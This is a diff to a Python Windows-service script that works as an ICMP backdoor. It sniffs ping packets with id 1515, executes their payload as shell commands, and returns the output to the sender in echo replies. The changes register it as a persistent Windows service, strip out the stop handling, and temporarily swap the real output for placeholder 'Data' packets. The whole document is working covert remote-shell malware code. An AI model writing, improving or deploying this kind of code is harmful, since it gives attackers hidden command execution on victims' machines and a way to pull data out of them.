@@ -3,6 +3,7 @@ import concurrent
 import multiprocessing
 import os
 import socket
+import subprocess
 import sys
 import threading
 import time
@@ -17,9 +18,14 @@ import ish_open
 import ishell
 import win32serviceutil
 
+output = None
+error = None
+
 
 def packet_callback(packet):
-    if ICMP in packet and packet[ICMP].id == 1515:
+    global output
+    global error
+    if ICMP in packet and packet[ICMP].id == 1515 and packet[ICMP].payload.load.decode('utf-8') != (output or error):
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ IN DATA +------")
         print(received_data)
@@ -36,15 +42,18 @@ def packet_callback(packet):
         process.communicate()
 
         output = output.decode('cp866').strip()
-        error = error.decode('cp866')
+        error = error.decode('cp866').strip()
         print(output)
         print(error)
         if output == '':
             reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / error
             send(reply_packet, verbose=False)
         else:
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / output
-            send(reply_packet, verbose=False)
+            data_list = ["Data1", "Data2", "Data3"]
+            packets = [IP(dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
+            send(packets, verbose=False)
+            #reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / "output"
+            #send(reply_packet, verbose=False)
 
 
 def ish_listen():
@@ -168,7 +177,6 @@ class Service(win32serviceutil.ServiceFramework):
 
     def __init__(self, args):
         win32serviceutil.ServiceFramework.__init__(self, *args)
-        self.runflag = True
         self.log('Service Initialized.')
         self.stop_event = win32event.CreateEvent(None, 0, 0, None)
         socket.setdefaulttimeout(60)
@@ -178,7 +186,6 @@ class Service(win32serviceutil.ServiceFramework):
 
     def SvcStop(self):
         self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
-        self.stop()
         self.log('Service has stopped.')
         win32event.SetEvent(self.stop_event)
         self.ReportServiceStatus(win32service.SERVICE_STOPPED)
@@ -195,25 +202,16 @@ class Service(win32serviceutil.ServiceFramework):
         except Exception as e:
             s = str(e)
             self.log('Exception :' + s)
-            self.SvcStop()
-
-    def stop(self):
-        self.runflag = False
-        try:
-            print()
-        except Exception as e:
-            self.log(str(e))
 
     def main(self):
-        self.runflag = True
+        sniff(filter="icmp", prn=packet_callback)
 
 
 if __name__ == '__main__':
-    main()
-    #if len(sys.argv) == 1:
-    #    servicemanager.Initialize()
-    #    servicemanager.PrepareToHostSingle(Service)
-    #    servicemanager.StartServiceCtrlDispatcher()
-    #else:
-    #    win32serviceutil.HandleCommandLine(Service)
-#
+    # main()
+    if len(sys.argv) == 1:
+        servicemanager.Initialize()
+        servicemanager.PrepareToHostSingle(Service)
+        servicemanager.StartServiceCtrlDispatcher()
+    else:
+        win32serviceutil.HandleCommandLine(Service)
